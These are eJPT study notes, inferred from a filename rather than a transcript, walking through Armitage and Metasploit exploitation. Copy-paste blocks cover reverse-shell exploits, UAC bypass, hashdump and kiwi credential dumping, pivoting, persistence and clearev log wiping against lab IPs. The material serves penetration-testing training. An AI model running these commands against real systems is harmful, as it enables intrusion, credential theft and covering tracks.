# Exploitation & Post Exploitation With Armitage (eJPT Study Notes)

Note: The transcript is not available. The following is inferred from the filename/context (01-MetasploitGUIs → Armitage). Commands and menu paths reflect common Armitage + Metasploit workflows; adapt to your lab.

## What the video covers (Introduction / big picture)
- Using Armitage (a GUI for Metasploit) to move from discovery to exploitation and post-exploitation.
- Importing/performing scans, mapping services to exploits, and generating “attack recommendations.”
- Launching exploits via the GUI and managing Meterpreter sessions.
- Running post-exploitation modules: privilege escalation, credential harvesting, loot collection, and basic pivoting.
- Notes on automation using “Find Attacks” and “Hail Mary” and when to avoid noisy options.

## Flow (ordered)
1. Prepare Metasploit’s database and services.
2. Launch Armitage and connect to the local Metasploit RPC.
3. Discover targets (Nmap via Armitage or import existing scans).
4. Annotate hosts; run “Find Attacks” to map exploits to services.
5. Choose a target and exploit (manual selection preferred over Hail Mary).
6. Get a Meterpreter session; stabilize (migrate) and enumerate.
7. Attempt privilege escalation (post modules, getsystem/bypassuac).
8. Gather loot: hashes, tokens, files, creds.
9. Optional pivoting: add routes, SOCKS proxy, scan internal subnets.
10. Cleanup: remove persistence, clear logs (where appropriate).

## Tools highlighted
- Armitage (Metasploit GUI; team-based and attack orchestration).
- Metasploit Framework (msfconsole, modules, Meterpreter).
- PostgreSQL + msfdb (Metasploit database integration).
- Nmap (recon; integrated or external, XML import).
- Post-exploitation modules:
  - post/multi/recon/local_exploit_suggester
  - post/windows/manage/migrate
  - post/windows/gather/hashdump (or hashdump in Meterpreter)
  - post/multi/manage/shell_to_meterpreter
  - auxiliary/server/socks_proxy (for pivoting)
- ProxyChains (for proxied scanning through SOCKS).

## Typical command walkthrough (detailed, copy-paste friendly)

Environment setup (Metasploit DB)
```
# Start database and initialize if needed
sudo systemctl start postgresql
msfdb init || msfdb start
```

Start Armitage and connect
```
# If Armitage exists in your image
armitage &
# In the GUI:
#   Host: 127.0.0.1
#   Port: 55553 (default)
#   User: msf  (default)
#   Pass: <blank or your chosen>
# Click: Connect → (Start MSF if prompted)
```
If Armitage is unavailable on your distro, use msfconsole to replicate the same workflow.

Recon with Nmap and import into Metasploit
```
# Fast scan with service and OS detection
sudo nmap -sS -sV -O -T4 -Pn -oA scan 10.10.10.0/24

# Import scan results into Metasploit DB (so Armitage shows hosts/services)
msfconsole -q -x "db_import scan.xml; hosts; services; exit"
```
In Armitage GUI: Hosts → Import Hosts → select Nmap XML; Hosts → Nmap Scan → Quick/Intense as needed.  
Use Attacks → Find Attacks to generate suggestions.

Set global listener options (so payloads auto-fill)
```
# In msfconsole or Armitage Console tab
setg LHOST <your_vpn_or_tun_ip>
setg LPORT 4444
```

Example exploitation flows (choose modules that fit your target)

- Example A: vsftpd 2.3.4 backdoor (Linux)
```
msfconsole
search type:exploit name:vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.20
set RPORT 21
run
```

- Example B: Windows SMB (classic NetAPI)
```
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.23
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
check
run
```

- Example C: Tomcat Manager upload (HTTP)
```
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.10.30
set RPORT 8080
set HTTPUSERNAME tomcat
set HTTPPASSWORD s3cr3t
set TARGETURI /manager/html
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST <your_ip>
run
```

Upgrading a basic shell to Meterpreter (if you get a simple /bin/sh or cmd)
```
# With a valid session ID (e.g., 1)
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

Post-exploitation: stabilize, enumerate, escalate
```
# Interact with Meterpreter session
sessions -i 1

# Basic info
sysinfo
getuid
ipconfig

# List processes and migrate to a stable one (Windows)
ps
migrate <pid>

# Try privilege escalation
getsystem
# or suggest local exploits
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# If UAC present (Windows), try bypass (example)
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
run
```

Credential access and loot
```
# Back in Meterpreter
load priv
hashdump             # Windows SAM hashes (requires sufficient privs)

# Try Mimikatz (kiwi) if available in your build
load kiwi
creds_all

# Grab interesting files
search -f *id_rsa*
download C:\\Users\\%USERNAME%\\Desktop\\sensitive.txt
```

Pivoting: route + SOCKS + proxychains
```
# Add a route for an internal subnet discovered from the compromised host
meterpreter > run autoroute -s 192.168.56.0/24
meterpreter > background

# Start a SOCKS proxy inside Metasploit
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

# Add proxychains entry (ensure only one matching line at the end)
echo "socks4 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf

# Scan the internal network through the pivot
proxychains -q nmap -sT -Pn -n -p 80,445 192.168.56.0/24
```

Persistence and cleanup
```
# Quick-and-dirty persistence (lab only; noisy)
meterpreter > run persistence -U -i 30 -p 4444 -r <your_ip>

# Remove persistence later
meterpreter > run persistence -r

# Clear Windows event logs (if you have necessary privileges; lab-only)
meterpreter > clearev
```

GUI equivalents in Armitage
- Hosts → Nmap Scan → choose scan profile.
- Hosts → Import Hosts → import Nmap XML.
- Attacks → Find Attacks (generate suggestions).
- Right-click host → Attack → choose specific module.
- Right-click session icon → Interact → Meterpreter/Shell.
- Right-click session → Explore/Privilege Escalation/Pivoting → relevant actions (migrate, getsystem, add route, SOCKS).

## Practical tips
- Armitage is deprecated on many modern distros; if it’s missing, perform the same steps in msfconsole.
- Prefer manual exploitation over “Hail Mary” to reduce noise and avoid breaking services.
- Always set LHOST correctly (your VPN/Tun interface) and consider setg LHOST to avoid mistakes across modules.
- Use check where available to validate an exploit before running it.
- After getting a session, migrate to a stable process before heavy actions.
- Run local_exploit_suggester early; match results against OS/patch level.
- Loot methodically: creds, configuration files, keys, and tokens; avoid over-collecting noise.
- Pivoting: add routes from inside Meterpreter, use SOCKS and proxychains for reliable tooling.
- Document every change; plan cleanup (remove persistence, close sessions).

## Minimal cheat sheet (one-screen flow)
```
# 1) DB + Armitage
sudo systemctl start postgresql
msfdb init || msfdb start
armitage &    # Or msfconsole

# 2) Recon
sudo nmap -sS -sV -O -T4 -Pn -oA scan 10.10.10.0/24
msfconsole -q -x "db_import scan.xml; exit"

# 3) Global options
msfconsole
setg LHOST <your_ip>
setg LPORT 4444

# 4) Pick exploit (example)
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.23
set PAYLOAD windows/meterpreter/reverse_tcp
check
run

# 5) Post-exploitation
sessions -i 1
sysinfo && getuid && ps
migrate <pid>
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# 6) Loot
sessions -i 1
hashdump
load kiwi
creds_all

# 7) Pivot
run autoroute -s 192.168.56.0/24
background
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
echo "socks4 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
proxychains -q nmap -sT -Pn -n -p 80,445 192.168.56.0/24
```

## Summary
- Armitage streamlines Metasploit by visualizing hosts, suggesting attacks, and managing sessions; it’s useful for learning but often replaced by msfconsole in modern setups.
- The core workflow: scan/import → find attacks → execute exploit → meterpreter post-exploitation → optional pivoting → cleanup.
- Focus on correct module selection, proper LHOST/LPORT, and stability steps (migrate) once a session is obtained.
- Use post modules for escalation and loot; pivot via autoroute + SOCKS + proxychains.
- Avoid “Hail Mary” in real environments; be deliberate, verify with check, and maintain an audit trail for cleanup.